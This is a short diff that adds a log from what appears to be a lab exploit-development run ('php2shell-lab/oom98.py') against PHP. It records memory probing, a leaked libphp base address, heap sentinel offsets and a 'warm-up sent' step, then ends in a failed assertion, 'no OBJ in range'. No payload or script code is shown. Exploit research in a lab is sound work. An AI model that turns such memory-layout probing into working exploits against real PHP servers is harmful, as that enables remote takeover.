@@ -1,0 +1,11 @@
+=== oom98: self-scan aiming ===
+    probe basic:  R=7fea59400000 d=670f8 110110 | pid=17
+
+    libphp=0x7fea5afd1000
+    warm-up sent
+    sentinel at R=0x7fea58a00000 V=0x7fea58a01720 (pid R=7fea58a00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7fea58c00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7fea59400000 d=5d62d 5d635 5d63d 5d645)
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom98.py", line 156, in <module>
+    assert OBJ, "no OBJ in range"
+           ^^^
+AssertionError: no OBJ in range
